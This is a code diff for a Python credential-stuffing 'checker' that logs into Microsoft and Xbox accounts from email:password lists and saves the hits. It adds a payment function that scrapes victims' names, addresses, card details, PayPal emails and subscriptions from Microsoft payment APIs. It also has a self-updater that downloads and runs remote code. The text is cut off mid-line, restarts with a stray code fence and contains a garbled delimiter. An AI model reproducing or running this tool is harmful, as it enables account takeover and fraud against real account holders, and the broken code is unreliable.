@@ -59,7 +59,7 @@ logo = Fore.CYAN + '''
  ██╔══██╗██║     ██╔══██║  ███╔╝    ██╔══╝        ██╔██╗ 
  ██████╔╝██████╗ ██║  ██║ ███████╗  ███████╗     ██╔╝  ██╗
  ╚═════╝ ╚═════╝╚═╝  ╚═╝ ╚══════╝  ╚══════╝     ╚═╝   ╚═╝   ~ The Ultimate Blaze Checker! 
-   Support: Telegram @HarshOGG or @sarthakog [t.me/blazecloud] 
+   Support: Telegram @HarshOGG or @sarthakog [t.me/blaze_cloud] 
             Discord @harshhhh_og or @sarthakkul  [discord.gg/blazecloud] '''
 
 sFTTag_url = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"
@@ -184,9 +184,9 @@ def check_for_updates():
         print(Fore.CYAN + f"Latest version from Firebase: {latest_version}")
         print(Fore.CYAN + f"Current version: {VERSION}")
 
-        # Compare versions
+        # Compare versions correctly
         if version.parse(latest_version) > version.parse(VERSION):
-            print(Fore.GREEN + "Update available! Downloading...")
+            print(Fore.GREEN + "Update available! Initiating download...")
             
             # Fetch download URL
             download_url = db.child("download_url").get().val()
@@ -194,23 +194,39 @@ def check_for_updates():
                 print(Fore.YELLOW + "Failed to retrieve download_url from Firebase.")
                 return
 
+            # Remove token if present (assuming public repo)
+            if "?token=" in download_url:
+                download_url = download_url.split("?token=")[0]
+            print(Fore.CYAN + f"Using download URL: {download_url}")
+
             # Create a temporary directory
             temp_dir = tempfile.mkdtemp()
             new_script_path = os.path.join(temp_dir, 'new_script.py')
+            print(Fore.CYAN + f"Downloading to: {new_script_path}")
             
-            # Download new script to temporary file
+            # Download new script with improved error handling
             try:
+                print(Fore.CYAN + "Starting download...")
                 response = requests.get(download_url, timeout=30, stream=True)
-                response.raise_for_status()
+                print(Fore.CYAN + f"Response status code: {response.status_code}")
+                response.raise_for_status()  # Raises exception for 4xx/5xx errors
                 with open(new_script_path, 'w', encoding='utf-8') as f:
+                    print(Fore.CYAN + "Writing downloaded content to file...")
                     f.write(response.text)
+                print(Fore.GREEN + "Download completed successfully.")
             except requests.exceptions.RequestException as e:
-                print(Fore.YELLOW + f"Failed to download new script: {e}")
+                print(Fore.YELLOW + f"Download failed: {e}")
+                if 'response' in locals():
+                    print(Fore.YELLOW + f"Response content (first 200 chars): {response.text[:200]}")
+                return
+            except Exception as e:
+                print(Fore.YELLOW + f"Unexpected error during download: {e}")
                 return
 
             # Create updater script
             updater_path = os.path.join(temp_dir, 'updater.py')
             main_script_path = os.path.abspath(__file__)
+            print(Fore.CYAN + f"Creating updater script at: {updater_path}")
             
             updater_code = f'''
 import os
@@ -223,20 +239,16 @@ def update_script():
     try:
         main_script = r"{main_script_path}"
         new_script = r"{new_script_path}"
-        
-        # Wait briefly to ensure main script has closed
+        print("Updater: Replacing {main_script} with {new_script}")
+        # Wait to ensure main script has closed
         time.sleep(2)
-        
         # Replace old script with new one
         shutil.copy2(new_script, main_script)
-        
-        print("Update completed successfully!")
-        
+        print("Updater: Update completed successfully!")
         # Restart the main script
         subprocess.Popen([sys.executable, main_script] + sys.argv[1:])
-        
     except Exception as e:
-        print(f"Update failed: {{e}}")
+        print(f"Updater: Update failed: {{e}}")
         input("Press Enter to continue...")
     finally:
         # Clean up temporary files
@@ -251,9 +263,10 @@ if __name__ == "__main__":
 '''
             with open(updater_path, 'w', encoding='utf-8') as f:
                 f.write(updater_code)
+            print(Fore.CYAN + "Updater script created successfully.")
             
             # Launch updater and exit
-            print(Fore.GREEN + "Starting update process...")
+            print(Fore.GREEN + "Launching update process...")
             subprocess.Popen([sys.executable, updater_path])
             print(Fore.CYAN + "Update initiated. Script will restart automatically.")
             sys.exit(0)
@@ -733,6 +746,64 @@ def get_xbox_rps(session, email, password, urlPost, sFTTag):
         f.write(f"{email}:{password}\n")
     return "None", session
 
+def payment(session, email, password):
+    global retries
+    while True:
+        try:
+            headers = {
+                "Host": "login.live.com",
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                "Accept-Language": "en-US,en;q=0.5",
+                "Accept-Encoding": "gzip, deflate",
+                "Connection": "close",
+                "Referer": "https://account.microsoft.com/"
+            }
+            r = session.get('https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=%7B%22userId%22%3A%22bf3383c9b44aa8c9%22%2C%22scopeSet%22%3A%22pidl%22%7D&prompt=none', headers=headers, timeout=10)
+            token = parse_qs(urlparse(r.url).fragment).get('access_token', ["None"])[0]
+            headers = {
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36',
+                'Pragma': 'no-cache',
+                'Accept': 'application/json',
+                'Authorization': f'MSADELEGATE1.0={token}',
+                'Content-Type': 'application/json',
+                'Host': 'paymentinstruments.mp.microsoft.com'
+            }
+            r = session.get('https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-GB', headers=headers, timeout=10)
+            def lr_parse(source, start_delim, end_delim, create_empty=True):
+                pattern = re.escape(start_delim) + r'(.*?)' + re.escape(end_delim)
+                match = re.search(pattern, source)
+                return match.group(1) if match else ('' if create_empty else None)
+            payment_data = {}
+            for key, start, end in [
+                ('date_registered', '"creationDateTime":"', 'T'),
+                ('fullname', '"accountHolderName":"', '"'),
+                ('address1', '"address":{"address_line1":"', '"'),
+                ('credit_card', 'paymentMethodFamily":"credit_card","display":{"name":"', '"'),
+                ('expiry_month', 'expiryMonth":"', '",'),
+                ('expiry_year', 'expiryYear":"', '",'),
+                ('last4', 'lastFourDigits":"', '",'),
+                ('paypal_email', 'email":"', '"'),
+                ('balance', 'balance":', ',"')
+            ]:
+                payment_data[key] = lr_parse(r.text, start, end, create_empty=key not in ['date_registered', 'fullname', 'paypal_email'])
+            json_data = json.loads(r.text)
+            address_fields = ['city', 'region', 'postal_code', 'cardType', 'country']
+            for field in address_fields:
+                payment_data[field] = next((item[field] for item in json_data if isinstance(json_data, list) and field in item), json_data.get(field, '')) if isinstance(json_data, list) else json_data.get(field, '')
+            user_address = f"[Address: {payment_data['address1']} City: {payment_data['city']} State: {payment_data['region']} Postalcode: {payment_data['postal_code']} Country: {payment_data['country']}]"
+            r = session.get('https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions', headers=headers, timeout=10)
+            subscriptions = []
+            for sub_id, prefix in [('ctp', 'ctp:'), ('mdr', 'mdr:')]:
+                sub_data = {}
+                sub_data['id'] = lr_parse(r.text, f'"subscriptionId":"{prefix}', '"')
+                if sub_data['id']:
+                    sub_data['auto_renew'] = lr_parse(r.text, f'"subscriptionId":"{prefix}{sub_data["id"]}","autoRenew":', ',')
+                    sub_data['start_date'] = lr_parse(r.text, '"startDate":"', '-penetration testing')
+                    sub_data['next_renewal'] = lr_parse(r.text, '"nextRenewalDate":"', 'T')
+                    if prefix == 'mdr':
+                        sub_data['recurring'] = lr_parse(r.text, 'recurringFrequency":"', '"')
+                        sub_data['title'] = lr_parse(r.text, f'"subscriptionId":"mdr:{sub_data["id"]}","autoRenew":{sub_data["auto```python
 def payment(session, email, password):
     global retries
     while True:
